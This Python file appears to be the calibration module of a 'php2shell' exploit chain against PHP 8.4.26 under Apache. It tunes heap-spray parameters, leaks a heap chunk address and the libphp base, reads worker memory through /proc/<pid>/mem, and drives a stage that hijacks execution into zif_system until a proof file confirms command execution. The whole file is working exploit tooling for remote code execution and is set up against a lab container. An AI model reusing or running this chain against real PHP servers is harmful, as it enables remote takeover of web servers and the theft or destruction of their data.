#!/usr/bin/env python3
"""Measure a php2shell profile. Every value written here comes from an oracle.

Oracles (no source constants):
  stage1.fillers  cookie carries a 2 MiB-aligned heap pointer (chunk leak)
  stage2.target   cookie[8:16] matches the symbol-resolved zval_ptr_dtor
  htdata_offset   scan the live Zend chunk for the marked 167-byte string:
                  header at data-0x18, rc=1, (type_info & 0x0f)==6, len=0xA7
  stage3.pads     the real stage-3 request writes the proof file

The htdata scan replays the full rotate -> stage1 -> stage2 -> arm -> B
sequence against a calibration-only endpoint (`/_hold.php`, same path length
as `/index.php`) that sleeps after request startup, so the parsed POST
strings are still alive and the worker's chunk can be read through
/proc/<pid>/mem (container has CAP_SYS_PTRACE).

Usage:
    python3 calibrate.py --target 8.4.26 [--span 16] [--json]
"""

from __future__ import annotations

import argparse
import os
import shutil
import struct
import subprocess
import sys
import threading
import time

import chain as C
import profile as P
import symbols as S

REPO = os.path.dirname(os.path.abspath(__file__))
HOLD_SRC = os.path.join(REPO, "docker", "probe", "hold.php")
HOLD_DST = os.path.join(REPO, "www", "_hold.php")
MARKER = b"PHP2SHELLPROBE"      # 14 bytes: same limit as a proof command
HT_LEN = 167                    # 0xA7
ZEND_STRING_HDR = 0x18


def _docker(container: str, cmd: str, binary: bool = False) -> bytes | str:
    out = subprocess.run(["docker", "exec", container, "sh", "-c", cmd],
                         stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    return out.stdout if binary else out.stdout.decode("latin1")


def worker_pid(container: str) -> str:
    for _ in range(80):
        out = _docker(container,
                      "ps -eo pid,user,comm | awk '$2==\"www-data\" && $3==\"apache2\" {print $1; exit}'")
        if out.strip():
            return out.strip().splitlines()[0]
        time.sleep(0.1)
    return ""


def read_chunk(container: str, pid: str, base: int, size: int = 0x200000) -> bytes:
    return _docker(container,
                   f"dd if=/proc/{pid}/mem iflag=skip_bytes,count_bytes "
                   f"skip={base} count={size} bs=65536", binary=True)  # type: ignore[return-value]


def install_hold() -> bool:
    if not os.path.exists(HOLD_SRC):
        return False
    shutil.copyfile(HOLD_SRC, HOLD_DST)
    return True


def remove_hold() -> None:
    try:
        os.unlink(HOLD_DST)
    except OSError:
        pass


def clear_proof(ch: C.Chain) -> None:
    try:
        os.unlink(ch.proof_host_path())
    except OSError:
        pass
    _docker(ch.container, f"rm -f {ch.p['proof']['file']}")


def read_proof(ch: C.Chain) -> str:
    try:
        with open(ch.proof_host_path(), "rb") as f:
            return f.read().decode("latin1").strip()
    except OSError:
        pass
    return str(_docker(ch.container, f"cat {ch.p['proof']['file']} 2>/dev/null")).strip()


def scan_ht_candidates(data: bytes) -> list[tuple[int, int]]:
    """Return (data_offset, type_info) for marked live 167-byte strings."""
    out: list[tuple[int, int]] = []
    start = 0
    while True:
        i = data.find(MARKER, start)
        if i < 0:
            break
        cand = i - 0x98
        if cand >= ZEND_STRING_HDR:
            rc, tinfo, _h, ln = struct.unpack_from("<IIQQ", data, cand - ZEND_STRING_HDR)
            if rc == 1 and (tinfo & 0x0F) == 6 and ln == HT_LEN:
                out.append((cand, tinfo))
        start = i + 1
    return out


def measure_htdata(prof: dict, ch: C.Chain, verbose: bool = True) -> dict:
    """Replay the full chain against /_hold.php and scan the live chunk."""
    installed = install_hold()
    if not installed:
        return {"ok": False, "reason": f"missing {HOLD_SRC}"}
    old_path = ch.t.path
    try:
        ch.rotate()
        chunk = ch.stage1()
        if not chunk:
            return {"ok": False, "reason": "stage1 leak failed during replay"}
        ch.rotate()
        libphp = ch.stage2()
        if not libphp:
            return {"ok": False, "reason": "stage2 leak failed during replay"}
        ch.rotate()

        ch.t.path = "/_hold.php"
        ch._arm(0, "unused%04d", 1, b"S" * 17,
                extra_headers={"Cookie": "PHPSESSID=" + "a" * 32}, pads=ch._pads())
        time.sleep(0.2)

        ht = bytearray(b"\x00" * HT_LEN)
        ht[0x98:0x98 + len(MARKER)] = MARKER
        parts = [C.field("PHPSESSID", b"attacksessionid0001"),
                 C.field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
        for i in range(int(prof["stage3"]["carrier"]["count"])):
            parts.append(C.field("f%02d" % i, b"F" * int(prof["stage3"]["carrier"]["len"])))
        parts.append(C.field("g00", struct.pack("<II", 2, 0x1A) + b"\x11" * 7))
        for i in range(int(prof["stage3"]["spray"]["count"])):
            parts.append(C.field(("a%030d" % i)[:int(prof["stage3"]["spray"]["name_len"])], bytes(ht)))

        body = C.build_multipart(parts, b"B" * 10)
        result: dict = {}

        def send() -> None:
            result["resp"] = ch.t.post(body, b"B" * 10, read_cap=65536, timeout=20)

        th = threading.Thread(target=send, daemon=True)
        th.start()
        time.sleep(1.2)

        pid = worker_pid(ch.container)
        data = read_chunk(ch.container, pid, chunk) if pid else b""
        if const := scan_ht_candidates(data):  # type: ignore[assignment]
            hits = const
        else:
            hits = []
        if verbose:
            C.log(f"[*] htdata scan: pid={pid} chunk=0x{chunk:x} "
                  f"markers={data.count(MARKER)} candidates={len(hits)}")
        if not hits:
            th.join(timeout=10)
            return {"ok": False, "reason": "no live zend_string candidate",
                    "chunk": chunk, "libphp": libphp, "pid": pid}
        data_offsets = sorted({off for off, _ in hits})
        first = data_offsets[0]
        # The live spray is a contiguous run of 0xC0-spaced 192-byte slots.
        # Raw multipart body copies carry the same 0x98-zero prefix and can
        # pass the header test; they sit in a separate cluster ~0x5100 away.
        run = [first]
        for off in data_offsets[1:]:
            if off - run[-1] == 0xC0:
                run.append(off)
            else:
                break
        tinfo = dict(hits)[first]
        th.join(timeout=10)
        return {
            "ok": True,
            "offset": first,
            "chunk": chunk,
            "libphp": libphp,
            "header_addr": first - ZEND_STRING_HDR,
            "rc": 1,
            "type_info": tinfo,
            "len": HT_LEN,
            "copies": len(run),
            "spacing": [0xC0],
            "extra": len(data_offsets) - len(run),
            "offsets": run,
        }
    finally:
        ch.t.path = old_path
        remove_hold()


def _verify_stage1(prof: dict, ch: C.Chain, n: int) -> int:
    ch.rotate()
    return ch.stage1(n)


def measure_stage1(prof: dict, ch: C.Chain, span: int = 16, verbose: bool = True) -> dict:
    seed = int(prof["heap"]["stage1"]["fillers"])
    seen: list[int] = []

    def attempt(n: int) -> bool:
        seen.append(n)
        base = _verify_stage1(prof, ch, n)
        if not base:
            return False
        # second independent sample
        base2 = _verify_stage1(prof, ch, n)
        if verbose:
            C.log(f"[+] stage1 fillers={n} chunk=0x{base:x} (confirm=0x{base2:x})")
        return bool(base2)

    if attempt(seed):
        return {"fillers": seed, "method": "seed verified twice", "tried": seen}
    for n in range(max(1, seed - span), seed + span + 1):
        if n == seed:
            continue
        if attempt(n):
            return {"fillers": n, "method": f"seed {seed} missed; swept +/-{span}", "tried": seen}
    return {"fillers": None, "method": "sweep failed", "tried": seen}


def measure_stage2(prof: dict, ch: C.Chain, span: int = 16, verbose: bool = True) -> dict:
    seed = int(prof["heap"]["stage2"]["target"])
    seen: list[int] = []

    def attempt(t: int) -> bool:
        seen.append(t)
        ch.rotate()
        base = ch.stage2(target=t)
        if not base:
            return False
        ch.rotate()
        base2 = ch.stage2(target=t)
        if verbose:
            C.log(f"[+] stage2 target={t} libphp=0x{base:x} (confirm=0x{base2:x})")
        return bool(base2)

    if attempt(seed):
        return {"target": seed, "method": "seed verified twice", "tried": seen}
    for t in range(max(1, seed - span), seed + span + 1):
        if t == seed:
            continue
        if attempt(t):
            return {"target": t, "method": f"seed {seed} missed; swept +/-{span}", "tried": seen}
    return {"target": None, "method": "sweep failed", "tried": seen}


def _pad_fields(specs: list[list[int]]) -> list[dict]:
    out = []
    for i, (nl, vl) in enumerate(specs):
        name = ("p%0*d" % (max(0, nl - 1), i))[:nl]
        out.append(C.field(name, b"V" * int(vl)))
    return out


def measure_pads(prof: dict, ch: C.Chain, chunk: int, libphp: int,
                 htdata_offset: int, max_sweep: int = 12, verbose: bool = True) -> dict:
    specs = [[int(a), int(b)] for a, b in prof["stage3"]["pads"]]
    if not specs:
        return {"pads": [], "method": "no pads in seed", "verified": False}
    base_spec = specs[0]
    zif = libphp + ch.syms["zif_system"]
    ht = chunk + htdata_offset
    tried: list[int] = []

    def attempt(candidate: list[list[int]]) -> bool:
        clear_proof(ch)
        ch.rotate()
        try:
            ch.stage3(ht, zif, pads=_pad_fields(candidate))
        except OSError:
            pass
        time.sleep(0.8)
        proof = read_proof(ch)
        if proof:
            if verbose:
                C.log(f"[+] pads={len(candidate)}x{base_spec} -> PROOF: {proof}")
            return True
        return False

    if attempt(specs):
        return {"pads": specs, "method": "seed verified by proof", "verified": True,
                "tried": 1}
    tried.append(len(specs))
    for k in range(0, max_sweep + 1):
        if k == len(specs):
            continue
        tried.append(k)
        if attempt([base_spec] * k):
            return {"pads": [base_spec] * k,
                    "method": f"seed pads missed; swept count 0..{max_sweep}",
                    "verified": True, "tried": tried}
    return {"pads": specs, "method": "proof oracle failed for all pad counts",
            "verified": False, "tried": tried}


def run(prof: dict, verbose: bool = True, timeout: float = 40.0,
        span: int = 16, max_pad_sweep: int = 12) -> int:
    container = prof["container"]
    C.log(f"[*] calibrate {prof['target']} ({container})")

    info = S.resolve(container, ["zif_system", "zval_ptr_dtor"], prof["libphp"])
    prof["symbols"] = info["symbols"]
    prof["symbols_sha256"] = info["sha256"]
    C.log(f"[+] symbols: zif=+0x{info['symbols']['zif_system']:x} "
          f"dtor=+0x{info['symbols']['zval_ptr_dtor']:x} sha256={info['sha256'][:16]}...")

    ch = C.Chain(prof, info["symbols"], verbose=verbose, timeout=timeout)

    s1 = measure_stage1(prof, ch, span=span, verbose=verbose)
    if s1["fillers"] is None:
        C.log("CALIBRATE_FAILED stage1")
        return 1
    prof["heap"]["stage1"]["fillers"] = s1["fillers"]

    s2 = measure_stage2(prof, ch, span=span, verbose=verbose)
    if s2["target"] is None:
        C.log("CALIBRATE_FAILED stage2")
        return 1
    prof["heap"]["stage2"]["target"] = s2["target"]

    hd = measure_htdata(prof, ch, verbose=verbose)
    if not hd.get("ok"):
        C.log(f"CALIBRATE_FAILED htdata: {hd.get('reason')}")
        return 1
    prof["heap"]["htdata_offset"] = int(hd["offset"])
    C.log(f"[+] htdata=+0x{hd['offset']:x} header=0x{hd['header_addr']:x} "
          f"type_info=0x{hd['type_info']:x} len=0x{hd['len']:x} "
          f"copies={hd['copies']} spacing={[hex(x) for x in hd['spacing']]}")

    pd = measure_pads(prof, ch, hd["chunk"], hd["libphp"], hd["offset"],
                      max_sweep=max_pad_sweep, verbose=verbose)
    prof["stage3"]["pads"] = pd["pads"]
    if not pd.get("verified"):
        C.log("CALIBRATE_FAILED pads (no proof)")
        return 1

    prof["calibration"] = {
        "method": "chain.py calibrate (oracle-driven)",
        "container": container,
        "symbols_sha256": info["sha256"],
        "stage1": s1,
        "stage2": s2,
        "htdata": {
            "offset": int(hd["offset"]),
            "header_addr": int(hd["header_addr"]),
            "rc": 1,
            "type_info": int(hd["type_info"]),
            "len": int(hd["len"]),
            "data": int(hd["offset"]),
            "copies": int(hd["copies"]),
            "spacing": [int(x) for x in hd["spacing"]],
            "method": "full rotate->stage1->stage2->arm->B replay against /_hold.php; "
                      "scan /proc/<pid>/mem for marker at data+0x98",
        },
        "pads": pd,
    }
    path = P.save(prof)
    C.log(f"[+] wrote {path}")
    C.log(f"PROFILE: {P.describe(prof)}")
    return 0


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", default="8.4.26")
    ap.add_argument("--profile", default="")
    ap.add_argument("--span", type=int, default=16)
    ap.add_argument("--max-pad-sweep", type=int, default=12)
    ap.add_argument("--timeout", type=float, default=40.0)
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args(argv)

    prof = P.load(args.target) if not args.profile else __import__("json").load(open(args.profile))
    return run(prof, verbose=not args.quiet, timeout=args.timeout,
               span=args.span, max_pad_sweep=args.max_pad_sweep)


if __name__ == "__main__":
    sys.exit(main())
